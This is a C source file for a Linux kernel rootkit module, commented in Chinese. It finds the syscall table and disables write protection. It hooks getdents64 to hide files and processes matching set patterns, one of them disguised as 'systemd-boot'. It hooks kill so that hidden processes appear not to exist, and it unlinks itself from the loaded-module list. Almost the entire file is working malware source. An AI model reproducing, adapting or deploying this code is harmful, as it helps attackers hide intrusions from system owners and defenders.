/*
 * Linux Rootkit Module (LKM)
 *
 * 功能：
 * 1. 隐藏进程（从 /proc 中移除）
 * 2. 隐藏文件（过滤 readdir 结果）
 * 3. 隐藏内核模块（从 lsmod 中移除）
 *
 * 编译: make -C /lib/modules/$(uname -r)/build M=$PWD modules
 *
 * Makefile:
 *   obj-m += rootkit.o
 *   all:
 *       make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 *   clean:
 *       make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anonymous");
MODULE_DESCRIPTION("Stealth LKM - Process/File/Module Hiding");
MODULE_VERSION("1.0");

/*
 * 配置
 */
#define HIDE_PROCESS_NAME "systemd-boot"
#define HIDE_FILE_PATTERN ".cache"
#define HIDE_MODULE_NAME "rootkit"

/*
 * 函数指针 - 保存原始系统调用
 */
static asmlinkage long (*orig_getdents64)(const struct pt_regs*);
static asmlinkage long (*orig_getdents)(const struct pt_regs*);
static asmlinkage long (*orig_kill)(const struct pt_regs*);

/*
 * 获取系统调用表地址
 */
static unsigned long* sys_call_table;

static unsigned long* get_sys_call_table(void) {
    unsigned long* tbl;
    tbl = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    return tbl;
}

/*
 * 禁用写保护
 */
static void disable_wp(void) {
    write_cr0(read_cr0() & (~0x10000));
}

/*
 * 启用写保护
 */
static void enable_wp(void) {
    write_cr0(read_cr0() | 0x10000);
}

/*
 * 隐藏进程的 getdents64 hook
 */
static asmlinkage long hooked_getdents64(const struct pt_regs* regs) {
    struct linux_dirent64 __user* dirent = (struct linux_dirent64*)regs->si;
    unsigned int len = regs->dx;
    struct linux_dirent64* current_dir, *dir = NULL;
    struct linux_dirent64* previous_dir;
    long err = orig_getdents64(regs);

    if (!err || err == -1)
        return err;

    dir = kzalloc(err, GFP_KERNEL);
    if (!dir)
        return err;

    if (copy_from_user(dir, dirent, err))
        goto done;

    current_dir = dir;
    previous_dir = NULL;

    while ((void*)current_dir < (void*)dir + err) {
        if (strstr(current_dir->d_name, HIDE_PROCESS_NAME) ||
            strstr(current_dir->d_name, HIDE_FILE_PATTERN)) {
            if (current_dir == dir) {
                // 第一个条目需要特殊处理
                err -= current_dir->d_reclen;
                memmove(current_dir, (void*)current_dir + current_dir->d_reclen, err);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }

        current_dir = (void*)current_dir + current_dir->d_reclen;
    }

    if (copy_to_user(dirent, dir, err))
        goto done;

done:
    kfree(dir);
    return err;
}

/*
 * 隐藏进程的 kill hook
 * 使 kill(pid, 0) 返回 ESRCH
 */
static asmlinkage long hooked_kill(const struct pt_regs* regs) {
    pid_t pid = regs->di;
    int sig = regs->si;

    struct task_struct* task;
    rcu_read_lock();
    for_each_process(task) {
        if (task->pid == pid && strstr(task->comm, HIDE_PROCESS_NAME)) {
            rcu_read_unlock();
            return -ESRCH;
        }
    }
    rcu_read_unlock();

    return orig_kill(regs);
}

/*
 * 模块隐藏
 * 从 module_kset 链表中摘除
 */
void hide_module(struct module* mod) {
    list_del(&mod->list);
    // 重新初始化（避免遍历时崩溃）
    INIT_LIST_HEAD(&mod->list);
}

/*
 * 初始化函数
 */
static int __init rootkit_init(void) {
    printk(KERN_INFO "[rootkit] Loading stealth module...\n");

    // 获取系统调用表
    sys_call_table = get_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "[rootkit] Failed to find sys_call_table\n");
        return -1;
    }

    // 保存原始系统调用
    orig_getdents64 = (void*)sys_call_table[__NR_getdents64];
    orig_getdents = (void*)sys_call_table[__NR_getdents];
    orig_kill = (void*)sys_call_table[__NR_kill];

    // 禁用写保护并替换
    disable_wp();

    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;

    enable_wp();

    // 隐藏自身
    hide_module(THIS_MODULE);

    printk(KERN_INFO "[rootkit] Stealth module loaded successfully\n");
    return 0;
}

/*
 * 退出函数
 */
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "[rootkit] Unloading...\n");

    // 恢复系统调用
    disable_wp();
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    enable_wp();

    printk(KERN_INFO "[rootkit] Unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
